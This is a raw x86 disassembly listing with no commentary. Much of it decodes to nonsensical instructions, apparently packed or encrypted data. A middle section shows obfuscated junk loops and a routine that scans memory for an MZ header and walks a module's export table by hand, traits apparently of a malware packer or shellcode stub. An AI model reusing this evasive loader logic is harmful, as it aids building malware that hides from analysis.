  418b06:	scas   eax,DWORD PTR es:[edi]
  418b07:	lods   eax,DWORD PTR ds:[esi]
  418b08:	xchg   ecx,eax
  418b09:	pop    ds
  418b0a:	or     eax,0xc685fe57
  418b0f:	push   ebx
  418b10:	pop    ecx
  418b11:	sub    bh,bh
  418b13:	loopne 0x418b91
  418b15:	cmp    eax,0x1e4828fe
  418b1a:	sub    DWORD PTR [ecx],edx
  418b1c:	mov    esp,0xc342c607
  418b21:	pop    es
  418b22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b23:	cmp    eax,DWORD PTR [edx+0x548a7cf4]
  418b29:	and    ah,BYTE PTR [ebp-0x56]
  418b2c:	jne    0x418b29
  418b2e:	or     BYTE PTR [ecx+esi*1-0x1200751e],0xb6
  418b36:	scas   eax,DWORD PTR es:[edi]
  418b37:	retf   0x5c2a
  418b3a:	mov    ch,0xb
  418b3c:	mov    DWORD PTR [esi+esi*1-0x46],edi
  418b40:	cwde   
  418b41:	rol    DWORD PTR [esi+0x1],cl
  418b44:	imul   edx,DWORD PTR [ebp+0x18c30a4b],0xe04a76c0
  418b4e:	out    0x88,eax
  418b50:	pop    edi
  418b51:	std    
  418b52:	xchg   DWORD PTR [esi+esi*2+0x28fedfc5],eax
  418b59:	xor    DWORD PTR [ebx-0x55a46f3a],ebx
  418b5f:	mov    DWORD PTR [edx-0x2],ebx
  418b62:	sahf   
  418b63:	dec    ebx
  418b64:	cmp    al,0x5c
  418b66:	add    al,0xf8
  418b68:	call   0x7237:0x603fbfde
  418b6f:	pop    es
  418b70:	in     eax,dx
  418b71:	jne    0x418b6e
  418b73:	out    0x3a,eax
  418b75:	push   di
  418b77:	push   edx
  418b78:	adc    al,0x2
  418b7a:	push   ss
  418b7b:	and    al,0x9e
  418b7d:	mov    ebx,0xad27065d
  418b82:	repnz xchg edi,eax
  418b84:	and    DWORD PTR ds:0x6e7b2cda,ebx
  418b8a:	loopne 0x418bf6
  418b8c:	mov    eax,0xa59c0918
  418b91:	jg     0x418bc5
  418b93:	jg     0x418bec
  418b95:	mov    ecx,0x6696014f
  418b9a:	fimul  DWORD PTR [ecx+eax*8-0x3c]
  418b9e:	stc    
  418b9f:	sbb    edi,esi
  418ba1:	jge    0x418b89
  418ba3:	in     al,dx
  418ba4:	adc    ebp,DWORD PTR [esi-0x41]
  418ba7:	push   edi
  418ba8:	outs   dx,BYTE PTR ds:[esi]
  418ba9:	adc    eax,0x91f72a3c
  418bae:	stos   BYTE PTR es:[edi],al
  418baf:	cmp    al,0x87
  418bb1:	mov    edi,0x9db3eb59
  418bb6:	cmp    eax,0x5042faa9
  418bbb:	push   es
  418bbc:	mov    esp,DWORD PTR [ebx+0x5]
  418bbf:	(bad)  
  418bc1:	lods   eax,DWORD PTR ds:[esi]
  418bc2:	cmp    cl,BYTE PTR [esi+ebp*4+0x3f]
  418bc6:	and    DWORD PTR [esi+eax*2+0x4b8450b1],ecx
  418bcd:	mov    eax,0x45388045
  418bd2:	jmp    0xd4f6c52f
  418bd7:	sbb    BYTE PTR [ebx],0x56
  418bda:	sbb    BYTE PTR [esp+eiz*4+0x6cd57de4],dl
  418be1:	hlt    
  418be2:	nop
  418be3:	jg     0x418c0f
  418be5:	mov    cl,0x94
  418be7:	ror    BYTE PTR [ebx],cl
  418be9:	test   eax,0x2e912098
  418bee:	or     eax,0x53a2c0ff
  418bf3:	rcr    DWORD PTR [eax],0x49
  418bf6:	test   DWORD PTR ds:0x109b0ab7,esi
  418bfc:	jb     0x418ba7
  418bfe:	jle    0x418c65
  418c00:	pop    eax
  418c01:	or     BYTE PTR [ecx-0x172fa063],ch
  418c07:	ja     0x418c2e
  418c09:	repnz dec eax
  418c0b:	lock inc ebx
  418c0d:	repnz mov ?,WORD PTR [ecx+0x51]
  418c11:	mov    esi,0xbcdc2246
  418c16:	sub    BYTE PTR [edi+0x48dd9a5a],0x1d
  418c1d:	xchg   edx,eax
  418c1e:	es add edi,ebp
  418c21:	mov    esi,0x3d38f2ff
  418c26:	nop
  418c27:	scas   al,BYTE PTR es:[edi]
  418c28:	fsubrp st(2),st
  418c2a:	jb     0x418c76
  418c2c:	add    al,0x2
  418c2e:	sti    
  418c2f:	cmp    DWORD PTR [edi+eax*1-0x55b5780b],0x5f
  418c37:	in     eax,0x73
  418c39:	lea    edi,es:[edi]
  418c3c:	xor    BYTE PTR [edx+0x6c91d0ef],al
  418c42:	push   0x1e0bc594
  418c47:	mov    ebx,0xd1574350
  418c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c4d:	std    
  418c4e:	aad    0x29
  418c50:	pusha  
  418c51:	ss lahf 
  418c53:	and    al,0x75
  418c55:	mov    esi,0x7474ca6b
  418c5a:	lods   al,BYTE PTR ds:[esi]
  418c5b:	jmp    0x42b3955a
  418c60:	retf   0x8d9
  418c63:	int    0x40
  418c65:	sbb    al,0x91
  418c67:	pop    es
  418c68:	cmp    eax,0xb1f45d5d
  418c6d:	mov    al,ds:0x68449be6
  418c72:	mov    bh,0x8
  418c74:	jne    0x418cb7
  418c76:	into   
  418c77:	repz and edi,ecx
  418c7a:	inc    esp
  418c7b:	and    DWORD PTR [esi],esi
  418c7d:	sub    BYTE PTR [esi],bh
  418c7f:	mov    bh,0x13
  418c81:	int    0xf0
  418c83:	cli    
  418c84:	(bad)  
  418c85:	pop    ss
  418c86:	test   DWORD PTR [esi-0x694e69a3],0xc6907a53
  418c90:	retf   0xc331
  418c93:	gs (bad) 
  418c95:	fidivr DWORD PTR [edi-0x68]
  418c98:	sbb    BYTE PTR [ecx+0x6f2e077e],bh
  418c9e:	pop    edi
  418c9f:	adc    dh,dl
  418ca1:	fldcw  WORD PTR [edi-0x36]
  418ca4:	shl    ch,cl
  418ca6:	pop    es
  418ca7:	lds    ebx,FWORD PTR [ebx+edi*2-0x4d]
  418cab:	xchg   BYTE PTR [eax+esi*1],dh
  418cae:	test   al,0x3b
  418cb0:	sti    
  418cb1:	(bad)  
  418cb2:	push   0x68d01d82
  418cb7:	push   edx
  418cb8:	aas    
  418cb9:	(bad)  
  418cbb:	ficomp DWORD PTR [ecx+0x62]
  418cbe:	mov    eax,0x71d5dff1
  418cc3:	test   DWORD PTR [edx],esp
  418cc5:	lds    ebx,FWORD PTR [esi-0x1132f7a2]
  418ccb:	and    eax,DWORD PTR [ecx+0x62]
  418cce:	call   0x56ca:0xe2ea5f69
  418cd5:	push   cs
  418cd6:	cmp    al,0xc2
  418cd8:	mov    WORD PTR [ebp-0x1e3a265],ss
  418cde:	data16 dec bl
  418ce1:	mov    ah,0x28
  418ce3:	push   esp
  418ce4:	mov    al,ds:0x8addeac3
  418ce9:	mov    bl,0xe6
  418ceb:	cmp    DWORD PTR [edi],ebp
  418ced:	and    esi,DWORD PTR [edi-0x50]
  418cf0:	jbe    0x418d37
  418cf2:	xor    esp,edx
  418cf4:	dec    esi
  418cf5:	jne    0x418cc3
  418cf7:	out    dx,eax
  418cf8:	ficomp DWORD PTR [edx+0x5777083d]
  418cfe:	in     al,0xba
  418d00:	jmp    0x325005e4
  418d05:	xor    BYTE PTR [ecx],bl
  418d07:	jmp    0x418d20
  418d09:	push   edi
  418d0a:	dec    ecx
  418d0b:	js     0x418cb2
  418d0d:	cwde   
  418d0e:	std    
  418d0f:	mov    esi,0x1ed1d792
  418d14:	jecxz  0x418d45
  418d16:	pop    ds
  418d17:	out    dx,al
  418d18:	out    dx,eax
  418d19:	lock loopne 0x418d62
  418d1c:	sar    dl,1
  418d1e:	fisubr WORD PTR [esi]
  418d20:	mov    al,BYTE PTR [eax-0x1b4b37ed]
  418d26:	mov    dl,0x19
  418d28:	sub    ecx,DWORD PTR [ebp-0x169e1ebc]
  418d2e:	ffreep st(6)
  418d30:	add    edx,edi
  418d32:	xchg   esi,eax
  418d33:	jge    0x418cce
  418d35:	inc    eax
  418d36:	ins    BYTE PTR es:[edi],dx
  418d37:	(bad)  
  418d38:	arpl   bx,sp
  418d3a:	outs   dx,DWORD PTR ds:[esi]
  418d3b:	les    ebx,FWORD PTR [esp-0x68]
  418d3f:	retf   
  418d40:	test   DWORD PTR [ebp+0x77e15493],esi
  418d46:	clc    
  418d47:	ror    BYTE PTR [ebx+ecx*2-0x2940206d],cl
  418d4e:	jl     0x418d69
  418d50:	out    dx,al
  418d51:	inc    ebp
  418d52:	mov    ebp,0x9d70abeb
  418d57:	iret   
  418d58:	jg     0x418d99
  418d5a:	xchg   edx,eax
  418d5b:	fdivp  st(7),st
  418d5d:	xor    DWORD PTR [ebx-0x1d],edx
  418d60:	jno    0x418d18
  418d62:	xchg   esp,eax
  418d63:	pushf  
  418d64:	fcom   st(3)
  418d66:	ds mov ebp,0x4a5bd48b
  418d6c:	mov    dh,0xd
  418d6e:	mov    bh,0x58
  418d70:	and    BYTE PTR [esi],ch
  418d72:	test   al,0xf2
  418d74:	leave  
  418d75:	jnp    0x418daa
  418d77:	std    
  418d78:	out    dx,al
  418d79:	div    DWORD PTR [ecx]
  418d7b:	xchg   edx,eax
  418d7c:	jg     0x418d0c
  418d7e:	xchg   esi,eax
  418d7f:	cmp    eax,0xae002cfb
  418d84:	rcr    BYTE PTR [ebx],1
  418d86:	cmp    dh,al
  418d88:	imul   edi,DWORD PTR [ecx],0x2ad59a80
  418d8e:	les    ebx,FWORD PTR [edi]
  418d90:	push   ebp
  418d91:	or     eax,ecx
  418d93:	cmp    eax,0x85b170c4
  418d98:	or     ecx,DWORD PTR [edi-0x27]
  418d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d9c:	and    al,0xa7
  418d9e:	imul   edi,DWORD PTR [esi+0x436cc4c7],0x5f
  418da5:	shl    DWORD PTR [edi+0x1b],cl
  418da8:	xchg   ebp,eax
  418da9:	test   DWORD PTR [ebp-0x4e],edx
  418dac:	jb     0x418e0d
  418dae:	outs   dx,DWORD PTR ds:[esi]
  418daf:	pop    edx
  418db0:	sub    DWORD PTR [ebx-0x58ccdbf9],0xffffffb0
  418db7:	sbb    eax,0x15ac15a3
  418dbc:	lods   al,BYTE PTR ds:[esi]
  418dbd:	mov    al,ds:0xc88c88cb
  418dc2:	dec    ebx
  418dc3:	cld    
  418dc4:	jle    0x418e38
  418dc6:	and    eax,0xef7509e5
  418dcb:	call   0x8b0c:0x60d6706a
  418dd2:	leave  
  418dd3:	retf   
  418dd4:	and    eax,0x3a3cc88b
  418dd9:	xor    al,0x95
  418ddb:	scas   al,BYTE PTR es:[edi]
  418ddc:	mov    ds:0xc6aeca20,al
  418de1:	sub    al,0x7
  418de4:	test   al,0x40
  418de6:	hlt    
  418de7:	addr16 dec eax
  418de9:	pop    es
  418dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418deb:	aas    
  418dec:	xlat   BYTE PTR ds:[ebx]
  418ded:	xchg   ebp,eax
  418dee:	adc    cl,bl
  418df0:	fcmovnbe st,st(7)
  418df2:	call   0x4c1994e3
  418df7:	or     eax,0x54a70c5a
  418dfc:	inc    edi
  418dfd:	add    DWORD PTR [esi+0x265341c8],edx
  418e03:	sub    al,0xf2
  418e05:	repz (bad) 
  418e07:	add    DWORD PTR [ecx+eax*1],eax
  418e0a:	push   ebx
  418e0b:	out    dx,al
  418e0c:	addr16 and eax,0x7e8879cc
  418e12:	outs   dx,BYTE PTR ds:[esi]
  418e13:	(bad)  
  418e14:	xor    bl,BYTE PTR [esi]
  418e16:	pusha  
  418e17:	cld    
  418e18:	and    al,0x8c
  418e1a:	push   cs
  418e1b:	mov    cl,0xb9
  418e1d:	mov    dl,0x76
  418e1f:	ja     0x418db0
  418e21:	mov    esi,0x61a5582d
  418e26:	jp     0x418e55
  418e28:	mov    DWORD PTR [esi+0x70],ebx
  418e2b:	xor    ah,BYTE PTR [ecx-0x5f23a0bb]
  418e31:	pop    ebx
  418e32:	add    eax,0x65fa2fee
  418e37:	popa   
  418e38:	enter  0xb597,0x76
  418e3c:	pop    es
  418e3d:	cmp    eax,0x9a7f7718
  418e42:	and    eax,0x5de30e7d
  418e47:	sub    DWORD PTR [ebx],ebp
  418e49:	push   ds
  418e4a:	xlat   BYTE PTR ds:[ebx]
  418e4b:	pop    ds
  418e4c:	adc    eax,0x5a738e7c
  418e51:	add    eax,0xc9d8c491
  418e56:	sbb    esi,DWORD PTR [esi+0x4b9478b7]
  418e5c:	shl    ebx,1
  418e5e:	iret   
  418e5f:	push   ebp
  418e60:	sub    eax,DWORD PTR [eax]
  418e62:	sbb    eax,0x77245346
  418e67:	iret   
  418e68:	mov    ebx,0x43cfe4fc
  418e6d:	mov    edx,0xc6d35a44
  418e72:	xchg   ecx,eax
  418e73:	div    BYTE PTR [edi+0x1a]
  418e76:	fnstcw WORD PTR [edx-0x7f]
  418e79:	fdivr  QWORD PTR [ecx+0x699fa0b6]
  418e7f:	xchg   BYTE PTR ds:0x221e7a1e,bh
  418e85:	data16 test dl,bl
  418e88:	cs ret 0xf45a
  418e8c:	mul    DWORD PTR [ebx-0x6e]
  418e8f:	leave  
  418e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e92:	push   esi
  418e93:	xchg   esi,eax
  418e94:	jg     0x418ec9
  418e96:	jae    0x418ead
  418e98:	out    0x1f,eax
  418e9a:	into   
  418e9b:	mov    al,ds:0x4d73d131
  418ea0:	stos   DWORD PTR es:[edi],eax
  418ea1:	sbb    BYTE PTR [edi+0x66],0x43
  418ea5:	mov    edi,0xf3c0b26f
  418eaa:	xlat   BYTE PTR ds:[ebx]
  418eab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eac:	mov    eax,ds:0x15a43745
  418eb1:	mov    eax,ds:0x2f32f444
  418eb6:	lock in al,0x97
  418eb9:	mov    ch,0xa5
  418ebb:	add    ecx,DWORD PTR [ebx]
  418ebd:	pop    ds
  418ebe:	test   DWORD PTR [edi+0x51],ebx
  418ec1:	clc    
  418ec2:	out    0xd0,al
  418ec4:	or     eax,0xd90b01e2
  418ec9:	and    al,cl
  418ecb:	fisubr WORD PTR [ebp-0x5d418ee9]
  418ed1:	sahf   
  418ed2:	nop
  418ed3:	mov    esi,0xa2811f05
  418ed8:	ror    DWORD PTR [eax+eax*8+0x601c2f25],cl
  418edf:	inc    esp
  418ee0:	pop    es
  418ee1:	fwait
  418ee2:	inc    eax
  418ee3:	jb     0x418e9e
  418ee5:	mov    esi,0xb0c564e4
  418eea:	cmp    bh,BYTE PTR [esi-0x53d748c5]
  418ef0:	sub    ecx,edx
  418ef2:	inc    ebx
  418ef3:	call   0xa3c8:0x8c29e6c1
  418efa:	xor    eax,0x73a6700c
  418eff:	ja     0x418ef1
  418f01:	xor    BYTE PTR [ebx+0x69],bh
  418f04:	sahf   
  418f05:	xchg   esi,eax
  418f06:	out    0xf6,eax
  418f08:	xor    eax,DWORD PTR [eax+0x57a42cb]
  418f0e:	clc    
  418f0f:	aad    0xf8
  418f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f12:	retf   0x8b04
  418f15:	cmp    eax,0x96f80018
  418f1a:	int3   
  418f1b:	ror    BYTE PTR [edx-0x7afd3b36],1
  418f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f22:	or     ah,bl
  418f24:	or     BYTE PTR ds:0xa436ffd3,bh
  418f2a:	mov    al,ds:0x5b8e10fb
  418f2f:	(bad)  
  418f30:	mov    bh,0x4b
  418f32:	mov    edx,0xae93e457
  418f37:	retf   
  418f38:	jmp    0x43cd90d8
  418f3d:	out    0xd7,eax
  418f3f:	xchg   ebx,eax
  418f40:	ins    DWORD PTR es:[edi],dx
  418f41:	ret    
  418f42:	cmp    ah,0x9a
  418f45:	ror    BYTE PTR [ebp+0x56479238],1
  418f4b:	mov    ecx,0x30fc1c70
  418f50:	jns    0x418ee4
  418f52:	repnz dec edx
  418f54:	daa    
  418f55:	inc    ecx
  418f56:	pop    ebp
  418f57:	lock xor al,BYTE PTR [esi-0x7f]
  418f5b:	inc    edi
  418f5c:	addr16 pop ebx
  418f5e:	push   0x1ff2bb2a
  418f63:	not    BYTE PTR [edx-0x6f196174]
  418f69:	and    al,dl
  418f6b:	sub    al,0x34
  418f6d:	mov    eax,ds:0xcdbbfebf
  418f72:	test   eax,0xdc146377
  418f77:	mov    al,0xeb
  418f79:	mov    ah,BYTE PTR [edi]
  418f7b:	xchg   edi,eax
  418f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f7d:	adc    ch,BYTE PTR [edx]
  418f7f:	and    al,0xc
  418f81:	sbb    BYTE PTR [eax+0xf50d756],dl
  418f87:	mov    edi,0x4b399023
  418f8c:	xor    ecx,0xffffffb0
  418f8f:	(bad)  
  418f90:	or     ch,cl
  418f92:	dec    ebp
  418f93:	mov    esp,0x242d8e77
  418f98:	(bad)  
  418f9a:	mov    ebx,0x516ba28f
  418f9f:	cmp    cl,BYTE PTR [ebp-0x641d8901]
  418fa5:	sbb    eax,0xd6a3e21d
  418fab:	mov    esi,0x51570be3
  418fb0:	repz gs xor ah,dh
  418fb4:	push   ebx
  418fb5:	stos   BYTE PTR es:[edi],al
  418fb6:	jp     0x41901d
  418fb8:	pop    ebp
  418fb9:	pushf  
  418fba:	addr16 xor al,0x7d
  418fbd:	sahf   
  418fbe:	scas   al,BYTE PTR es:[edi]
  418fbf:	push   ss
  418fc0:	fstp   QWORD PTR cs:[ebp+0x20]
  418fc4:	sbb    edx,esp
  418fc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fc7:	aam    0x69
  418fc9:	push   0xffffffe8
  418fcb:	outs   dx,DWORD PTR ds:[esi]
  418fcc:	pop    edi
  418fcd:	add    ebp,esp
  418fcf:	mov    ebp,0x2a3f85ee
  418fd4:	jmp    0x599d26df
  418fd9:	pop    edi
  418fda:	mov    esp,DWORD PTR [esi+eax*4-0x2613a93b]
  418fe1:	arpl   WORD PTR [eax+0x4f],si
  418fe4:	(bad)
  418fe8:	in     al,0x9c
  418fea:	inc    edi
  418feb:	outs   dx,BYTE PTR ds:[esi]
  418fec:	inc    ecx
  418fed:	adc    al,0x87
  418fef:	cld    
  418ff0:	neg    DWORD PTR [edi+0x39dd6b89]
  418ff6:	dec    eax
  418ff7:	pop    ds
  418ff8:	mov    edi,DWORD PTR [ebx-0x6e386829]
  418ffe:	sahf   
  418fff:	mov    ah,0xf1
  419001:	push   ebx
  419002:	movq   mm6,QWORD PTR [ebx-0x7ea09746]
  419009:	xchg   ebp,eax
  41900a:	out    dx,eax
  41900b:	sahf   
  41900c:	add    BYTE PTR [eax+0x587b58],ch
  419012:	stc    
  419013:	shl    DWORD PTR [edx],cl
  419015:	mov    edi,0xce3d1149
  41901a:	(bad)  
  41901b:	mov    edx,0x3272db
  419020:	add    DWORD PTR ds:0x42a008,0x5e50
  41902a:	add    edi,edx
  41902c:	mov    DWORD PTR ds:0x42a000,0x7626
  419036:	cmp    DWORD PTR [eax],edi
  419038:	je     0x419045
  41903e:	mov    eax,DWORD PTR [eax]
  419040:	jmp    0x41b79b
  419045:	mov    eax,DWORD PTR [ebp+0x18]
  419048:	mov    DWORD PTR ds:0x42b004,0x29bc
  419052:	cmp    eax,esi
  419054:	jne    0x41906e
  41905a:	push   0xf89c85b5
  41905f:	mov    DWORD PTR ds:0x42a018,0x6618
  419069:	jmp    0x41b78a
  41906e:	mov    esi,DWORD PTR [ebp+0x18]
  419071:	mov    eax,0xf89c85b4
  419076:	mov    DWORD PTR ds:0x42a010,0x8ff
  419080:	cmp    esi,eax
  419082:	mov    DWORD PTR ds:0x42d010,0x7cdb
  41908c:	jne    0x41b77a
  419092:	mov    eax,DWORD PTR [ebp+0x10]
  419095:	xor    esi,esi
  419097:	add    esi,DWORD PTR ds:0x423e50
  41909d:	mov    esi,DWORD PTR [esi]
  41909f:	and    DWORD PTR ds:0x42a010,esi
  4190a5:	xor    eax,ecx
  4190a7:	mov    DWORD PTR ds:0x42c01c,0x15
  4190b1:	cmp    DWORD PTR ds:0x42c01c,0x0
  4190b8:	je     0x419106
  4190be:	cmp    DWORD PTR ds:0x42c01c,0x7
  4190c5:	jne    0x4190d4
  4190cb:	push   DWORD PTR [ebp-0xc]
  4190ce:	call   DWORD PTR ds:0x425030
  4190d4:	cmp    DWORD PTR ds:0x42c01c,0x8
  4190db:	jne    0x4190ee
  4190e1:	mov    esi,DWORD PTR ds:0x42c01c
  4190e7:	dec    esi
  4190e8:	mov    DWORD PTR ds:0x42c01c,esi
  4190ee:	mov    esi,DWORD PTR ds:0x42c01c
  4190f4:	dec    esi
  4190f5:	mov    DWORD PTR ds:0x42c01c,esi
  4190fb:	jmp    0x4190b1
  419100:	neg    DWORD PTR ds:0x42b00c
  419106:	add    eax,edx
  419108:	and    DWORD PTR ds:0x42b004,0x0
  419112:	mov    esi,DWORD PTR ds:0x42b004
  419118:	inc    esi
  419119:	mov    DWORD PTR ds:0x42b004,esi
  41911f:	cmp    DWORD PTR ds:0x42b004,0x4
  419126:	jne    0x41913c
  41912c:	push   0x6d2e
  419131:	push   0x438c
  419136:	call   DWORD PTR ds:0x425034
  41913c:	cmp    DWORD PTR ds:0x42b004,0x3
  419143:	jne    0x419156
  419149:	mov    esi,DWORD PTR ds:0x42b004
  41914f:	inc    esi
  419150:	mov    DWORD PTR ds:0x42b004,esi
  419156:	cmp    DWORD PTR ds:0x42b004,0x10
  41915d:	jb     0x419112
  419163:	mov    DWORD PTR [ebp-0x18],eax
  419166:	and    DWORD PTR ds:0x42d014,0x0
  419170:	mov    eax,ds:0x42d014
  419175:	inc    eax
  419176:	mov    ds:0x42d014,eax
  41917b:	cmp    DWORD PTR ds:0x42d014,0x1a
  419182:	jne    0x41919d
  419188:	push   0x424564
  41918d:	push   0x42452a
  419192:	push   0x87a6
  419197:	call   DWORD PTR ds:0x42503c
  41919d:	cmp    DWORD PTR ds:0x42d014,0x15
  4191a4:	jb     0x419170
  4191aa:	inc    esi
  4191ab:	mov    eax,DWORD PTR [ebp+0xc]
  4191ae:	mov    DWORD PTR ds:0x42c000,0x10
  4191b8:	cmp    DWORD PTR ds:0x42c000,0x0
  4191bf:	je     0x419213
  4191c5:	cmp    DWORD PTR ds:0x42c000,0x5
  4191cc:	jne    0x4191e5
  4191d2:	push   DWORD PTR [ebp-0x14]
  4191d5:	push   0x594c
  4191da:	push   0x7c33
  4191df:	call   DWORD PTR ds:0x425040
  4191e5:	cmp    DWORD PTR ds:0x42c000,0x6
  4191ec:	jne    0x4191ff
  4191f2:	mov    esi,DWORD PTR ds:0x42c000
  4191f8:	dec    esi
  4191f9:	mov    DWORD PTR ds:0x42c000,esi
  4191ff:	xor    esi,esi
  419201:	add    esi,DWORD PTR ds:0x42c000
  419207:	dec    esi
  419208:	mov    DWORD PTR ds:0x42c000,esi
  41920e:	jmp    0x4191b8
  419213:	mov    esi,DWORD PTR [ebp-0x8]
  419216:	and    DWORD PTR ds:0x429020,0x232c
  419220:	xor    eax,ecx
  419222:	inc    DWORD PTR ds:0x429028
  419228:	add    eax,edx
  41922a:	and    DWORD PTR ds:0x42a008,0x32e2
  419234:	imul   eax,DWORD PTR [esi]
  419237:	mov    esi,DWORD PTR [ebp+0x8]
  41923a:	xor    esi,ecx
  41923c:	add    esi,edx
  41923e:	cmp    esi,eax
  419240:	mov    eax,DWORD PTR [ebp-0x4]
  419243:	push   ebx
  419244:	je     0x419263
  41924a:	mov    esi,DWORD PTR [ebp-0x18]
  41924d:	add    DWORD PTR [eax],esi
  41924f:	mov    eax,DWORD PTR [ebp-0x4]
  419252:	mov    esi,DWORD PTR [ebp+0xc]
  419255:	xor    esi,ecx
  419257:	add    esi,edx
  419259:	imul   esi,DWORD PTR [eax]
  41925c:	mov    DWORD PTR [eax],esi
  41925e:	jmp    0x419268
  419263:	mov    esi,DWORD PTR [ebp+0x14]
  419266:	xor    DWORD PTR [eax],esi
  419268:	mov    eax,DWORD PTR [ebp-0x4]
  41926b:	mov    edi,DWORD PTR [ebp+0x10]
  41926e:	xor    edi,ecx
  419270:	mov    esi,0xffcd8d25
  419275:	mov    ebx,esi
  419277:	sub    ebx,edi
  419279:	add    DWORD PTR [eax],ebx
  41927b:	mov    eax,DWORD PTR [ebp-0x4]
  41927e:	mov    edi,DWORD PTR [ebp-0x8]
  419281:	add    edi,DWORD PTR [eax]
  419283:	mov    DWORD PTR [ebp-0x8],edi
  419286:	mov    eax,DWORD PTR [ebp+0xc]
  419289:	mov    edi,DWORD PTR [ebp+0xc]
  41928c:	xor    edi,ecx
  41928e:	xor    eax,ecx
  419290:	lea    eax,[eax+edi*1+0x64e5b6]
  419297:	mov    edi,DWORD PTR [ebp+0xc]
  41929a:	xor    edi,ecx
  41929c:	add    edi,edx
  41929e:	imul   eax,edi
  4192a1:	mov    edi,DWORD PTR [ebp+0xc]
  4192a4:	xor    edi,ecx
  4192a6:	sub    edi,eax
  4192a8:	mov    eax,DWORD PTR [ebp-0x4]
  4192ab:	add    edi,edx
  4192ad:	cmp    DWORD PTR [eax],edi
  4192af:	mov    eax,DWORD PTR [ebp-0x4]
  4192b2:	mov    edi,DWORD PTR [ebp+0x10]
  4192b5:	jg     0x4192c8
  4192bb:	xor    edi,ecx
  4192bd:	mov    ebx,esi
  4192bf:	sub    ebx,edi
  4192c1:	add    DWORD PTR [eax],ebx
  4192c3:	jmp    0x4192ce
  4192c8:	xor    edi,ecx
  4192ca:	add    edi,edx
  4192cc:	add    DWORD PTR [eax],edi
  4192ce:	mov    eax,DWORD PTR [ebp-0x8]
  4192d1:	mov    edi,DWORD PTR [ebp-0x10]
  4192d4:	mov    eax,DWORD PTR [eax]
  4192d6:	xor    edi,ecx
  4192d8:	add    edi,0x3272da
  4192de:	not    edi
  4192e0:	and    eax,edi
  4192e2:	movsx  di,BYTE PTR [eax+0x1]
  4192e7:	mov    ebx,0x3b4b
  4192ec:	sub    di,bx
  4192ef:	mov    ebx,0x8a85
  4192f4:	xor    di,bx
  4192f7:	mov    ebx,0x4f8a
  4192fc:	cmp    di,bx
  4192ff:	jne    0x419327
  419305:	movsx  di,BYTE PTR [eax]
  419309:	mov    ebx,0x3b4b
  41930e:	sub    di,bx
  419311:	mov    ebx,0x8a85
  419316:	xor    di,bx
  419319:	mov    ebx,0x4f87
  41931e:	cmp    di,bx
  419321:	je     0x419337
  419327:	mov    edi,DWORD PTR [ebp-0x10]
  41932a:	xor    edi,ecx
  41932c:	mov    ebx,esi
  41932e:	sub    ebx,edi
  419330:	add    eax,ebx
  419332:	jmp    0x4192e2
  419337:	mov    esi,DWORD PTR [ebp-0x14]
  41933a:	mov    esi,DWORD PTR [esi]
  41933c:	mov    edi,DWORD PTR [eax+0x3c]
  41933f:	lea    esi,[edi+esi*8+0x78]
  419343:	mov    esi,DWORD PTR [esi+eax*1]
  419346:	mov    DWORD PTR [ebp-0x8],esi
  419349:	mov    esi,DWORD PTR [ebp+0x8]
  41934c:	xor    esi,ecx
  41934e:	add    esi,edx
  419350:	mov    DWORD PTR [ebp-0x14],esi
  419353:	mov    esi,DWORD PTR [ebp+0x8]
  419356:	mov    edi,DWORD PTR [ebp-0x8]
  419359:	xor    esi,ecx
  41935b:	add    esi,edx
  41935d:	pop    ebx
  41935e:	cmp    edi,esi
  419360:	jne    0x41937e
  419366:	mov    eax,DWORD PTR [ebp+0xc]
  419369:	xor    eax,ecx
  41936b:	mov    ecx,DWORD PTR [ebp-0x8]
  41936e:	add    eax,edx
  419370:	imul   eax,ecx
  419373:	mov    DWORD PTR [ebp-0x8],eax
  419376:	push   DWORD PTR [ebp+0x18]
  419379:	jmp    0x41b78a
  41937e:	mov    ecx,DWORD PTR [ebp-0x8]
  419381:	add    ecx,eax
  419383:	jmp    0x41b73b
  419388:	dec    ebx
  419389:	cmp    al,0x60
  41938b:	or     DWORD PTR [edi],0x426c6b9d
  419391:	push   cs
  419392:	mov    ch,BYTE PTR [eax+ebx*8-0x6e]
  419396:	rol    BYTE PTR [ebx+0x626101df],cl
  41939c:	(bad)  
  41939d:	pop    edi
  41939e:	bound  esp,QWORD PTR [edx+0x22]
  4193a1:	retf   
  4193a2:	aam    0x7
  4193a4:	xlat   BYTE PTR ds:[ebx]
  4193a5:	push   ecx
  4193a6:	nop
  4193a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193a8:	call   0x5fa3:0xa65922ee
  4193af:	jg     0x419411
  4193b1:	mov    ebx,0xf14a4df2
  4193b6:	bound  esp,QWORD PTR [eax-0x1c]
  4193b9:	dec    esp
  4193ba:	and    esi,DWORD PTR [ebx+0x7842fc6c]
  4193c0:	pushf  
  4193c1:	(bad)  [esi+edi*8]
  4193c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193c5:	popa   
  4193c6:	sbb    al,0x7f
  4193c8:	pop    eax
  4193c9:	outs   dx,BYTE PTR ds:[esi]
  4193ca:	mov    eax,ds:0x26bd51f7
  4193cf:	mov    ecx,0x93dca0da
  4193d4:	test   ebx,ebp
  4193d6:	sar    DWORD PTR [eax],cl
  4193d8:	cmc    
  4193d9:	outs   dx,DWORD PTR ds:[esi]
  4193da:	jns    0x419438
  4193dc:	jno    0x419456
  4193de:	adc    edi,esi
  4193e0:	test   eax,0x1947a990
  4193e5:	add    eax,0x51d47675
  4193ea:	sbb    DWORD PTR [ecx+0x6bb664e3],edi
  4193f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193f1:	lods   al,BYTE PTR ds:[esi]
  4193f2:	mov    WORD PTR [edx+esi*2+0x6d],es
  4193f6:	cmp    BYTE PTR [ecx-0x2f],0xb8
  4193fa:	pop    eax
